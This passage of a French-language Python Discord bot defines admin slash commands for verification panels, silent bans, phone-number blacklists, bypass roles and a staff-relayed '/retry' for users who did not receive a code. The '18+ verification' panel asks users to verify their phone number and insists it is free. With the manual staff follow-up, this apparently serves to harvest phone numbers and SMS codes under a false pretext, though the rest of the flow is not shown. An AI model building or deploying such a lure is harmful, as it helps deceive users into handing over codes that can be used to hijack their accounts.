        if entry["channel_id"] == interaction.channel_id:
            existing = entry
            break

    if existing and existing.get("message_id"):
        try:
            old_msg = await interaction.channel.fetch_message(existing["message_id"])
            await old_msg.edit(embed=embed, view=view)
            embed_success = discord.Embed(
                title="Panneau mis à jour",
                description="Le panneau de vérification a été mis à jour dans ce salon.",
                color=COLOR_SUCCESS
            )
            await interaction.response.send_message(embed=embed_success, ephemeral=True)
            return
        except (discord.NotFound, discord.HTTPException):
            pass

    await interaction.response.send_message(embed=embed, view=view)
    msg = await interaction.original_response()

    if existing:
        existing["message_id"] = msg.id
        existing["type"] = "normal"
    else:
        setup_data.append({
            "channel_id": interaction.channel_id,
            "message_id": msg.id,
            "type": "normal"
        })
    save_setup_data(setup_data)
    log.info(f"Setup fait dans #{interaction.channel.name} (msg: {msg.id})")


@bot.tree.command(name="setupnsfw", description="Crée le panneau de vérification NSFW dans ce salon")
@app_commands.default_permissions(administrator=True)
async def setupnsfw(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🔞 VÉRIFICATION 18+ OBLIGATOIRE",
        description=(
            "Ce serveur est réservé aux adultes.\n\n"
            "Pour continuer, vous devez vérifier votre numéro de téléphone et confirmer votre âge.\n"
            "Cette vérification est gratuite et ne nécessite aucun paiement.\n\n"
            "Cliquez sur « 🔞 Vérifier » ci-dessous et suivez les instructions."
        ),
        color=SETUP_NSFW_COLOR
    )
    embed.set_footer(text="🔞 Vérification 18+ obligatoire • 0,00 €")

    view = VerifyButtonView(is_nsfw=True)

    setup_data = load_setup_data()
    existing = None
    for entry in setup_data:
        if entry["channel_id"] == interaction.channel_id:
            existing = entry
            break

    if existing and existing.get("message_id"):
        try:
            old_msg = await interaction.channel.fetch_message(existing["message_id"])
            await old_msg.edit(embed=embed, view=view)
            embed_success = discord.Embed(
                title="Panneau NSFW mis à jour",
                description="Le panneau de vérification NSFW a été mis à jour dans ce salon.",
                color=COLOR_SUCCESS
            )
            await interaction.response.send_message(embed=embed_success, ephemeral=True)
            return
        except (discord.NotFound, discord.HTTPException):
            pass

    await interaction.response.send_message(embed=embed, view=view)
    msg = await interaction.original_response()

    if existing:
        existing["message_id"] = msg.id
        existing["type"] = "nsfw"
    else:
        setup_data.append({
            "channel_id": interaction.channel_id,
            "message_id": msg.id,
            "type": "nsfw"
        })
    save_setup_data(setup_data)
    log.info(f"Setup NSFW fait dans #{interaction.channel.name} (msg: {msg.id})")

@bot.tree.command(name="proofsetup", description="Crée le panneau de preuves dans ce salon")
@app_commands.default_permissions(administrator=True)
async def proofsetup(interaction: discord.Interaction):
    embed = discord.Embed(
        title="Le serveur est-il legit ?",
        description="> **Oui c'est legit**\n> **Non c'est du scam (no proof = refus)**",
        color=0x5865f2
    )
    embed.set_footer(text="Système de vérification de preuves")
    view = ProofView()
    await interaction.response.send_message(embed=embed, view=view)
    log.info(f"Proof setup fait dans #{interaction.channel.name}")

@bot.tree.command(name="retry", description="Relancer la vérification si vous n'avez pas reçu le code")
async def retry(interaction: discord.Interaction):
    if not isinstance(interaction.channel, discord.DMChannel):
        embed = discord.Embed(
            title="Erreur",
            description="Cette commande fonctionne uniquement en message privé.",
            color=COLOR_DANGER
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    user_id = interaction.user.id
    now = datetime.datetime.now().timestamp()
    if user_id in retry_cooldowns:
        remaining = retry_cooldowns[user_id] + 600 - now
        if remaining > 0:
            embed = discord.Embed(
                title="Trop tôt",
                description=f"Veuillez attendre {int(remaining)} secondes avant de réessayer.",
                color=COLOR_WARNING
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

    if user_id in pending_verifications:
        embed = discord.Embed(
            title="Déjà en cours",
            description="Vous avez déjà une vérification en cours.",
            color=COLOR_WARNING
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    if is_user_blacklisted(user_id, blacklist):
        embed = discord.Embed(
            title="Accès refusé",
            description="Vous êtes blacklisté.",
            color=COLOR_DANGER
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    retry_cooldowns[user_id] = now
    embed = discord.Embed(
        title="Nouvelle demande",
        description="Votre demande de relance a été transmise au staff.\n\nUn membre va vous contacter sous peu.",
        color=COLOR_SUCCESS
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)

    user = await bot.fetch_user(user_id)
    await send_staff_panel(user, "Numéro inconnu")

@bot.tree.command(name="clear", description="Supprime un nombre de messages dans le salon")
@app_commands.default_permissions(administrator=True)
@app_commands.describe(nombre="Nombre de messages à supprimer")
async def clear(interaction: discord.Interaction, nombre: int):
    if nombre < 1 or nombre > 100:
        embed = discord.Embed(
            title="Nombre invalide",
            description="Choisissez un nombre entre 1 et 100.",
            color=COLOR_WARNING
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)
    deleted = await interaction.channel.purge(limit=nombre)
    embed = discord.Embed(
        title="Salon nettoyé",
        description=f"{len(deleted)} messages supprimés.",
        color=COLOR_SUCCESS
    )
    await interaction.followup.send(embed=embed, ephemeral=True)

@bot.tree.command(name="ping", description="Affiche la latence du bot")
async def ping(interaction: discord.Interaction):
    latency = round(bot.latency * 1000)
    embed = discord.Embed(title="Pong", description=f"Latence : {latency}ms", color=COLOR_SUCCESS)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="ban", description="Ban un utilisateur silencieusement par ID")
@app_commands.default_permissions(administrator=True)
@app_commands.describe(user_id="ID de l'utilisateur à bannir")
async def ban(interaction: discord.Interaction, user_id: str):
    try:
        target_id = int(user_id.strip())
    except Exception:
        embed = discord.Embed(
            title="ID invalide",
            description="Entrez un ID Discord valide.",
            color=COLOR_DANGER
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    banned = await ban_user(target_id, "Banni via commande /ban")
    embed = discord.Embed(
        title="Utilisateur banni",
        description=f"**ID :** `{target_id}`\n**Banni :** {'Oui' if banned else 'Déjà banni'}",
        color=COLOR_DANGER
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="unban", description="Déban un utilisateur par ID et nettoie toutes ses données")
@app_commands.default_permissions(administrator=True)
@app_commands.describe(user_id="ID de l'utilisateur à débannir")
async def unban(interaction: discord.Interaction, user_id: str):
    try:
        target_id = int(user_id.strip())
    except Exception:
        embed = discord.Embed(
            title="ID invalide",
            description="Entrez un ID Discord valide.",
            color=COLOR_DANGER
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    guild = bot.get_guild(config.GUILD_ID)
    status_text = ""
    cleared_items = []

    if guild:
        try:
            await guild.unban(discord.Object(id=target_id), reason="Débanni via commande /unban")
            cleared_items.append("Ban Discord retiré")
        except discord.NotFound:
            cleared_items.append("Pas de ban Discord actif")
        except Exception as e:
            cleared_items.append(f"Erreur ban Discord : {str(e)}")

    remove_user_blacklist(target_id, blacklist)
    cleared_items.append("Blacklist retirée")

    if target_id in pending_verifications:
        pending_verifications.pop(target_id, None)
        cleared_items.append("Vérification en attente nettoyée")

    if target_id in cooldowns:
        cooldowns.pop(target_id, None)
        cleared_items.append("Cooldown réinitialisé")

    if target_id in retry_cooldowns:
        retry_cooldowns.pop(target_id, None)
        cleared_items.append("Retry cooldown réinitialisé")

    for sid, sdata in list(staff_active_claims.items()):
        if sdata.get("user_id") == target_id:
            try:
                await sdata["view"].close_ticket("Fermé (unban)", do_ban=False)
                cleared_items.append("Ticket staff fermé")
            except Exception:
                pass
            break

    embed = discord.Embed(
        title="✅ Utilisateur débanni et nettoyé",
        description=f"**ID :** `{target_id}`\n\n**Actions effectuées :**\n" + "\n".join([f"• {c}" for c in cleared_items]),
        color=COLOR_SUCCESS
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)
    log.info(f"Unban complet pour {target_id} : {', '.join(cleared_items)}")

@bot.tree.command(name="banlist", description="Affiche la liste des utilisateurs blacklist")
@app_commands.default_permissions(administrator=True)
async def banlist(interaction: discord.Interaction):
    users = blacklist.get("users", [])
    phones = blacklist.get("phones", [])
    embed = discord.Embed(title="Blacklist", color=COLOR_DANGER)
    if users:
        embed.add_field(name="Utilisateurs", value="\n".join([f"`{uid}`" for uid in users[:20]]), inline=True)
    else:
        embed.add_field(name="Utilisateurs", value="*Aucun*", inline=True)

    if phones:
        embed.add_field(name="Numéros", value="\n".join([f"`{mask_phone(p)}`" for p in phones[:20]]), inline=True)
    else:
        embed.add_field(name="Numéros", value="*Aucun*", inline=True)

    embed.set_footer(text=f"Total : {len(users)} users • {len(phones)} numéros")
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="setrejectrole", description="Définir le rôle attribué lors d'un refus de vérification")
@app_commands.default_permissions(administrator=True)
@app_commands.describe(role_id="ID du rôle à attribuer")
async def setrejectrole(interaction: discord.Interaction, role_id: str):
    try:
        value = int(role_id.strip())
    except Exception:
        embed = discord.Embed(title="ID invalide", description="Entrez un ID de rôle valide.", color=COLOR_DANGER)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    config.REJECT_ROLE_ID = value
    embed = discord.Embed(
        title="Rôle défini",
        description=f"Le rôle de refus est maintenant configuré sur `{value}`.",
        color=COLOR_SUCCESS
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="bypass", description="Donne le rôle de bypass manuel à un membre")
@app_commands.default_permissions(administrator=True)
@app_commands.describe(user_id="ID Discord du membre")
async def bypass(interaction: discord.Interaction, user_id: str):
    try:
        target_id = int(user_id.strip())
    except Exception:
        embed = discord.Embed(title="ID invalide", description="Entrez un ID Discord valide.", color=COLOR_DANGER)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    guild = bot.get_guild(config.GUILD_ID)
    if not guild:
        embed = discord.Embed(title="Serveur introuvable", description="Le guild principal est introuvable.", color=COLOR_DANGER)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    member = guild.get_member(target_id)
    if not member:
        embed = discord.Embed(title="Membre introuvable", description="Ce membre n'est pas présent sur ce serveur.", color=COLOR_WARNING)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    role = guild.get_role(config.BYPASS_ROLE_ID)
    if not role:
        embed = discord.Embed(
            title="Rôle introuvable",
            description=f"Le rôle bypass `{config.BYPASS_ROLE_ID}` est introuvable.",
            color=COLOR_DANGER
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    if role in member.roles:
        embed = discord.Embed(title="Déjà autorisé", description=f"<@{target_id}> a déjà le rôle bypass.", color=COLOR_SUCCESS)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    await member.add_roles(role, reason="Bypass manuel via /bypass")
    embed = discord.Embed(title="Bypass activé", description=f"<@{target_id}> a reçu le rôle bypass.", color=COLOR_SUCCESS)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="sync", description="Sync les commandes slash")
@app_commands.default_permissions(administrator=True)
async def sync(interaction: discord.Interaction):
    await bot.tree.sync()
    embed = discord.Embed(
        title="Commandes synchronisées",
        color=COLOR_SUCCESS
    )
    await interaction.response.send_message(
        embed=embed,
        ephemeral=True
    )

# ===== LANCEMENT =====

if __name__ == "__main__":
    if not config.BOT_TOKEN:
        log.critical("BOT_TOKEN manquant dans .env")
        raise SystemExit(1)

    bot.run(config.BOT_TOKEN)
